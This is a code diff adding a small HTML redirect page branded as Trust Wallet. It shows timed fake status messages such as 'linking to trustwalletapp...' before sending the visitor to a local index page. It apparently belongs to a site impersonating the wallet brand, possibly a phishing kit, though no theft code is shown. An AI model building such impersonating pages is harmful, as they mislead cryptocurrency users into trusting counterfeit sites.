@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect... | Trust Wallet</title>
+
+                <!-- Favicon...start -->
+                <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
+                <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
+                <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
+                <link rel="manifest" href="/favicon/site.webmanifest">
+                <!-- Favicon...end -->
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-style: italic;
+        }
+    </style>
+</head>
+    <body onload="myFunction()">
+        
+        <p id="txt-1"></p>
+
+        <script>
+           function packing() {
+               document.getElementById("txt-1").innerHTML = "packing data...";
+           }
+
+           function loading() {
+               document.getElementById("txt-1").innerHTML = "loading data...";
+           }
+
+           function linking() {
+               document.getElementById("txt-1").innerHTML = "linking to trustwalletapp...";
+           }
+
+           function redirect() {
+               document.getElementById("txt-1").innerHTML = "Redirecting...";
+           }
+
+           function toWalletApp() {
+			    window.open("/index.htm", "_top");		    
+            }
+
+           setTimeout(packing, 1400);
+           setTimeout(loading, 1700);
+           setTimeout(linking, 2000);
+           setTimeout(redirect, 2200);
+           setTimeout(toWalletApp, 3000);
+        </script>
+        <noscript>
+			Please enable JavaScript for the website to function properly!
+		</noscript>
+    </body>
+</html>
